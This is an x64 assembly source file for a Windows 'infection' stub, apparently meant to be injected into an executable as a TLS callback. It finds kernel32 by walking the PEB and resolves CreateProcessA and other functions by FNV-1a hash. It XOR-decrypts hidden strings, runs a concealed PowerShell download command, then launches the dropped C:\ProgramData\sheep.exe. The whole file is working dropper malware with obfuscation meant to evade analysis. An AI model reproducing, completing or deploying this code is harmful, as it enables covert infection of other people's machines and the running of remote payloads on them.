%include "infection_strings.asm"
   
section .text
[BITS 64]

; %define TLS
   
global main
   ; this is now a TLS callback, which has the following header:
   ;
   ;    VOID (NTAPI *PIMAGE_TLS_CALLBACK)(PVOID DllHandle, DWORD Reason, PVOID Reserved)
main:
   mov [rsp+0x20],r12
   mov [rsp+0x18],rsi
   mov [rsp+0x10],rdi
   mov [rsp+8],rbp

%ifdef TLS
   cmp edx,1
   jnz infection__end           ; if the given Reason is DLL_PROCESS_ATTACH, do the needful
                                ; otherwise, terminate the infection.
%endif
   
   mov rbp, rsp
   sub rsp, 0x28        ; allocate space for our string structs as well as an address to a dynamic function

   call infection__data         ; perform a call-pop to get offsets to our data
infection__data__start:         ; this prevents relocations from forming because we are not
infection__data__sheep:
   LAUNCH_COMMAND               ; dd strlen
   ;; db key
   ;; db string_data
infection__data__powershell:
   DOWNLOAD_COMMAND             ; dd strlen
   ;; db key
   ;; db string_data
infection__data:
   pop rbx                      ; get the pointer to the start of the data

   ;; allocate some space for our decrypted strings
   mov eax, dword [rbx+(infection__data__sheep-infection__data__start)] ; get sheep length
   inc eax                      ; allocate for the null byte
   mov ecx, eax                 ; save a copy for later
   mov r12, 16                  ; align to 16-byte boundaries
   xor edx,edx
   div r12                      ; string_size % 16
   test edx, edx                
   jz infection__alloc_sheep_aligned ; (string_size % 16) != 0
   mov eax, r12d
   sub eax, edx                 ; 16 - (string_size % 16)
   add ecx, eax                 ; voila, aligned boundary

infection__alloc_sheep_aligned:
   sub rsp, rcx                 ; allocate that space on the stack
   mov [rbp-0x10], rsp          ; save the pointer to that allocated space
   mov [rbp-0x18], rcx          ; save the aligned size of the allocation

   mov eax, dword [rbx+(infection__data__powershell-infection__data__start)]
   inc eax
   mov ecx, eax
   xor edx,edx
   div r12
   test edx, edx
   jz infection__alloc_powershell_aligned
   mov eax, r12d
   sub eax, edx
   add ecx, eax

infection__alloc_powershell_aligned:
   sub rsp, rcx
   mov [rbp-0x20], rsp
   mov [rbp-0x28], rcx

   sub rsp,0xF0                 ; now allocate space on the stack for our CreateProcessA structs, as well as aligning it
   mov rax, [gs:0x60]           ; get current PEB
   mov rcx, [rax+0x18]          ; peb->Ldr
   mov rax, [rcx+0x10]          ; ldr->InLoadOrderModuleList.Flink (the current module)
   mov rcx, [rax]               ; list_entry->InLoadOrderLinks.Flink (ntdll.dll)
   mov rax, [rcx]               ; list_entry->InLoadOrderLinks.Flink (kernel32.dll)
   mov r12, [rax+0x30]          ; list_entry->DllBase
   mov rcx, r12
   mov edx, 0xda1a7563
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
   mov rsi, rax                 ; get function for GetFileAttributesA
   mov rcx, r12
   mov edx, 0x71948ca4
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x71948ca4)
   mov rdi, rax                 ; get function for WaitForSingleObject
   mov rcx, r12
   mov edx, 0x4a7c0a09
   call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x4a7c0a09)
   mov [rbp-8], rax             ; get function for CreateProcessA

   xor ecx,ecx                  ; zero out the STARTUPINFO structure and the PROCESS_INFORMATION structure
   xorps xmm0,xmm0
   movups [rsp+0x50],xmm0
   movups [rsp+0x60],xmm0
   mov dword [rsp+0x70], 0x68
   movups [rsp+0x74],xmm0
   movups [rsp+0x84],xmm0
   movups [rsp+0x94],xmm0
   movups [rsp+0xa4],xmm0
   movups [rsp+0xb4],xmm0
   movups [rsp+0xc4],xmm0
   mov [rsp+0xd4],ecx

   lea rcx, [rbx+(infection__data__sheep-infection__data__start)] ; load sheep string struct
   mov rdx, [rbp-0x10]          ; decrypted sheep string pointer
   call decrypt_string

   mov rcx, [rbp-0x10] ; C:\ProgramData\sheep.exe
   call rsi            ; GetFileAttributesA("C:\\ProgramData\\sheep.exe")
   cmp eax, 0xFFFFFFFF          ; eax == INVALID_FILE_ATTRIBUTES
   jnz infection__payload_exists ; jump taken means the file exists

   lea rcx, [rbx+(infection__data__powershell-infection__data__start)] ; load powershell string struct
   mov rdx, [rbp-0x20]          ; decrypted powershell string pointer
   call decrypt_string

   xor ecx,ecx
   mov rdx, [rbp-0x20] ; powershell command
   xor r8d,r8d
   xor r9d,r9d
   xorps xmm0,xmm0
   movups [rsp+0x20],xmm0
   movups [rsp+0x30],xmm0
   lea rax, [rsp+0x70]
   mov [rsp+0x40], rax
   lea rax, [rsp+0x50]
   mov [rsp+0x48], rax
   call [rbp-8]                 ; CreateProcessA(NULL, powershell_command, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)
   test eax,eax
   jz infection__stack_cleanup       ; CreateProcessA failing is an error

   mov rcx,[rsp+0x50]
   mov edx,0xFFFFFFFF
   call rdi                     ; WaitForSingleObject(proc_info.hProcess, INFINITE)
   test eax,eax
   jnz infection__stack_cleanup ; WaitForSingleObject returns 0 on success

   xor ecx,ecx                  ; zero out the STARTUPINFO structure and the PROCESS_INFORMATION again
   xorps xmm0,xmm0
   movups [rsp+0x50],xmm0
   movups [rsp+0x60],xmm0
   mov dword [rsp+0x70], 0x68
   movups [rsp+0x74],xmm0
   movups [rsp+0x84],xmm0
   movups [rsp+0x94],xmm0
   movups [rsp+0xa4],xmm0
   movups [rsp+0xb4],xmm0
   movups [rsp+0xc4],xmm0
   mov [rsp+0xd4],ecx
   
infection__payload_exists:
   xor ecx,ecx          
   mov rdx, [rbp-0x10]  ; the sheep executable
   xor r8d,r8d
   xor r9d,r9d
   xorps xmm0,xmm0
   movups [rsp+0x20],xmm0
   movups [rsp+0x30],xmm0
   lea rax, [rsp+0x70]
   mov [rsp+0x40], rax
   lea rax, [rsp+0x50]
   mov [rsp+0x48], rax
   call [rbp-8]                 ; CreateProcessA(NULL, sheep_exe, NULL, NULL, FALSE, 0, NULL, NULL, &startup_info, &proc_info)

infection__stack_cleanup:
   add rsp, 0x118               ; 0xF0 + 0x28
   add rsp, [rbp-0x18]
   add rsp, [rbp-0x28]
   
infection__end:
   mov r12,[rsp+0x20]
   mov rsi,[rsp+0x18]
   mov rdi,[rsp+0x10]
   mov rbp,[rsp+8]
   ret
   
   ;; rcx: the string struct
   ;; rdx: the output address
decrypt_string:
   mov [rsp+8], rbp
   mov [rsp+0x10], rsi
   mov [rsp+0x18], rdi
   mov rax,rcx
   mov rdi,rdx
   mov ecx,dword [rax]
   lea rsi,[rax+5]
   mov al,byte [rax+4]

decrypt_loop:
   mov dl, byte [rsi]
   xor dl, al
   mov [rdi], dl
   inc rsi
   inc rdi
   dec ecx
   test ecx,ecx
   jnz decrypt_loop

   mov dl, byte [rsi]
   mov byte [rdi], dl
   ret

   ; rcx: the dll module
   ; rdx: the 32-bit fnv321a hash value to look up
get_proc_by_hash:
   mov [rsp+8],rbx
   mov [rsp+0x10],rsi
   mov [rsp+0x18],rdi
   movsxd rax, dword [rcx+0x3c] ; e_lfanew
   mov r8d, dword [rax+rcx+0x88] ; nt_headers->OptionalHeader.DataDirectory[IMAGE_EXPORT_DIRECTORY] rva
   add r8, rcx                      ; pointer to the export directory
   xor r9d, r9d
   mov r10d, dword [r8+0x20]    ; ExportDirectory.AddressOfNames
   add r10, rcx
   mov r11, rcx                 ; store the dll in a different register
   mov edi, dword [r8+0x24] ; ExportDirectory.AddressOfNameOrdinals
   add rdi, rcx
   mov esi, dword [r8+0x1C] ; ExportDirectory.AddressOfFunctions
   add rsi, rcx
   mov rbx, rdx                 ; store our target hash for later
   mov r8d, dword [r8+0x18] ; ExportDirectory.NumberOfNames

get_proc_by_hash__name_iter:
   mov eax, [r10]               ; name RVA
   add rax, r11                 ; add the base pointer
   mov edx, 0x811c9dc5          ; begin calculating the fnv32-1a hash

get_proc_by_hash__fnv321a:
   movzx ecx, byte [rax]    ; get the byte of the string
   test cl,cl                   ; check for zero
   jz get_proc_by_hash__fnv321a_break ; break on null byte
   
   lea rax,[rax+1]                    ; advance one byte
   xor ecx, edx                       ; hash ^= name[i]
   imul edx, ecx, 0x1000193           ; hash *= 0x1000193
   jmp short get_proc_by_hash__fnv321a

get_proc_by_hash__found_function:
   movzx ecx, word [rdi+r9*2] ; name_ordinals[name_index]
   mov eax, [rsi+rcx*4]           ; functions[name_ordinals[name_index]]
   add rax, r11                   ; add the base pointer
   jmp get_proc_by_hash__epilogue ; function found

get_proc_by_hash__fnv321a_break:
   cmp edx, ebx                 ; check if this hash matches our target hash
   jz get_proc_by_hash__found_function

   inc r9d                      ; iterate to the next name in the list
   add r10, 4
   cmp r9d, r8d
   jb get_proc_by_hash__name_iter
   
get_proc_by_hash__return_nullptr:
   xor rax,rax                  ; ya fucked up, you get a nullptr

get_proc_by_hash__epilogue:
   mov rbx,[rsp+8]
   mov rsi,[rsp+0x10]
   mov rdi,[rsp+0x18]
   ret
   
